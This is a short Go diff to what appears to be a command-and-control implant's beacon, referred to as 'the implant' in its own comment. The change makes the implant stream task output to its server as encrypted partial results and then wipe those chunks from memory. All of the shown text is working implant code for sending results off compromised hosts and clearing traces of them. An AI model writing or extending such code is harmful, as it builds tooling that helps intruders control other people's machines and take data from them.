@@ -317,6 +317,25 @@ func (b *Beacon) sendHeartbeat(conn net.Conn, sess *session.Session, busy int) e
 // sendResult reports the outcome of a task and wipes the output behind
 // it: the server has it, and the implant does not need it in memory.
 func (b *Beacon) sendResult(conn net.Conn, sess *session.Session, id string, outcome *Outcome) error {
+	// A streamed answer travels in pieces: every chunk is a partial
+	// result, so the task stays open while the chunks travel, and the
+	// final result below closes it.
+	for _, chunk := range outcome.Chunks {
+		partial := map[string]any{
+			"id":      id,
+			"code":    int64(outcome.Code),
+			"out":     chunk,
+			"err":     "",
+			"partial": true,
+		}
+		frame, err := sess.Encrypt(wire.MsgResult, partial)
+		if err != nil {
+			return fmt.Errorf("seal partial result: %w", err)
+		}
+		if err := writeFrame(conn, frame); err != nil {
+			return fmt.Errorf("write partial result: %w", err)
+		}
+	}
 	body := map[string]any{
 		"id":   id,
 		"code": int64(outcome.Code),
@@ -334,6 +353,7 @@ func (b *Beacon) sendResult(conn net.Conn, sess *session.Session, id string, out
 		return fmt.Errorf("write result: %w", err)
 	}
 	outcome.Out = nil
+	outcome.Chunks = nil
 	return nil
 }
 
